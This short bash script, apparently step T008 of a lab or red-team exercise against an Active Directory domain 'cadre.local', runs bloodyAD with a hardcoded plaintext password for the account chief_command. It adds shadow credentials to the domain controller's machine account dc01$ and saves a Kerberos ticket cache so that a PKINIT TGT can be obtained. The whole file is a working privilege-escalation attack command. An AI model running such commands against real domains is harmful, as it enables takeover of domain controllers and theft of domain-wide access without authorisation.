#!/usr/bin/env bash
# T008 — add shadow credentials to dc01$ as chief_command, then PKINIT TGT
set -u
export PATH=/usr/local/bin:/usr/bin:/bin:/home/vagrant/.local/bin
cd /tmp
echo '=== T008: add shadow creds to dc01$ + PKINIT TGT ==='
timeout 90 bloodyAD --host dc01.cadre.local -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' add shadowCredentials 'dc01$' --path /tmp/t008-dc01.ccache 2>&1 | tail -12
echo "RC=$?"
ls -la /tmp/t008-dc01.ccache 2>/dev/null
echo 'T008_DONE'
